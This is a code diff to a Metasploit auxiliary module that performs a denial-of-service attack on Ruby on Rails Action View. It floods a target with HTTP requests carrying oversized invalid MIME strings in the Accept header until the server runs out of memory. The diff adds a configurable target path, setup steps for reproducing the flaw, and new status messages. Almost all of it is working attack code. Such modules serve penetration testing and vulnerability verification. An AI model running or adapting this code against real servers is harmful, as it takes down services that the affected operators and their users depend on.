@@ -3,9 +3,7 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 require 'msf/core'
-
 
 class Metasploit3 < Msf::Auxiliary
   include Msf::Exploit::Remote::Tcp
@@ -15,10 +13,10 @@ class Metasploit3 < Msf::Auxiliary
     super(update_info(info,
       'Name'           => 'Ruby-on-Rails Action View MIME Memory Exhaustion',
       'Description'    => %q{
-        This module exploits a Denial of Service (DoS) condition in the handling of MIME caching
-        of Action View. By sending a specially crafted 'Accept' header to a rails application,
-        it is possible for it to store the invalid MIME type, and may eventually consumes all
-        memory if enough invalid MIMEs are given.
+        This module exploits a Denial of Service (DoS) condition in Action View that requires
+        a controller action. By sending a specially crafted content-type header to a rails
+        application, it is possible for it to store the invalid MIME type, and may eventually
+        consumes all memory if enough invalid MIMEs are given.
 
         Versions 3.0.0 and other later versions are affected, fixed in 4.0.2 and 3.2.16.
       },
@@ -40,6 +38,7 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(80),
+        OptString.new('URIPATH',    [true, 'The URI to send the requests to', '/application']),
         OptInt.new('MAXSTRINGSIZE', [true, 'Max string size', 60000]),
         OptInt.new('REQ_COUNT',     [true, 'Number of HTTP requests for each iteration', 500]),
         OptInt.new('RLIMIT',        [true,  "Number of requests to send", 100000])
@@ -48,9 +47,9 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def host
-      host = datastore['RHOST']
-      host += ":" + datastore['RPORT'].to_s if datastore['RPORT'] != 80
-      host
+    host = datastore['RHOST']
+    host += ":" + datastore['RPORT'].to_s if datastore['RPORT'] != 80
+    host
   end
 
   def long_string
@@ -58,8 +57,11 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def http_request
+    uri = datastore['URIPATH']
+    uri = "/#{uri}" if uri !~ /^\//
+
     http = ''
-    http << "GET /#{Rex::Text.rand_text_alpha(6)} HTTP/1.1\r\n"
+    http << "GET /#{datastore['URIPATH']} HTTP/1.1\r\n"
     http << "Host: #{host}\r\n"
     http << "Accept: #{long_string}\r\n"
     http << "\r\n"
@@ -77,13 +79,24 @@ class Metasploit3 < Msf::Auxiliary
         disconnect
       }
 
-      print_status("Attack finished. If you read it, it wasn't enough to trigger an Out Of Memory condition.")
+      print_status("Attack finished. Either the server isn't vulnerable, or please dos harder.")
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
       print_status("Unable to connect to #{host}.")
     rescue ::Errno::ECONNRESET, ::Errno::EPIPE, ::Timeout::Error
-      print_good("DoS successful. #{host} not responding. Out Of Memory condition probably reached")
+      print_good("DoS successful. #{host} not responding. Out Of Memory condition probably reached.")
     ensure
       disconnect
     end
   end
 end
+
+=begin
+
+Reproduce:
+
+1. Add a def index; end to ApplicationController
+2. Add an empty index.html.erb file to app/views/application/index.html.erb
+3. Uncomment the last line in routes.rb
+4. Hit /application 
+  
+=end
